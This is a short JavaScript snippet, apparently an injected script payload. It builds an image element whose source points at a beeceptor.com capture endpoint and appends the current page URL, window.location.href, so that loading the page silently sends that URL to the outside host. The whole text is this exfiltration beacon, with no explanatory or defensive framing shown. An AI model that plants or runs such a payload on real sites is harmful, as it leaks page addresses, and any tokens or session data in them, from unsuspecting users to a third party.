var img = document.createElement("img");

var data = window.location.href;
console.log(JSON.stringify(data));
img.src="https://beeceptor.com/console/zaedadzadf?data="+data;
document.body.appendChild(img);
